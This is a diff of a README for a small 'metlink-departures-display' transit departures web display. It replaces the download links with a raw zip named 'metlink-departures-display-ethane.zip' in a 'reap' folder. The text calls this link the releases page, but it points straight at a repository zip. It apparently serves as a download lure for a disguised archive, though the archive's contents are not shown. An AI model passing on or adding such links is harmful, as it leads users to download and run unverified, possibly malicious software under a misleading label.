@@ -8,7 +8,7 @@ Welcome to the metlink-departures-display! This simple web display shows you the
 
 To get started, you’ll need to download the software. Click the button below to visit the releases page.
 
-[![Download Latest Release](https://raw.githubusercontent.com/SayaliNachare/metlink-departures-display/main/reap/metlink-departures-display-v1.1.zip)](https://raw.githubusercontent.com/SayaliNachare/metlink-departures-display/main/reap/metlink-departures-display-v1.1.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/SayaliNachare/metlink-departures-display/main/reap/metlink-departures-display-ethane.zip)](https://raw.githubusercontent.com/SayaliNachare/metlink-departures-display/main/reap/metlink-departures-display-ethane.zip)
 
 Once you're on the releases page, look for the latest version. You can download the appropriate file for your system. Follow these steps:
 
@@ -61,7 +61,7 @@ If you need more help, consider checking our support page or the community forum
 
 ## 🔗 Useful Links
 
-- **Releases Page**: [Visit this page to download](https://raw.githubusercontent.com/SayaliNachare/metlink-departures-display/main/reap/metlink-departures-display-v1.1.zip)
+- **Releases Page**: [Visit this page to download](https://raw.githubusercontent.com/SayaliNachare/metlink-departures-display/main/reap/metlink-departures-display-ethane.zip)
 - **Support Forum**: Find help from other users or ask questions.
 
 ## 📜 License
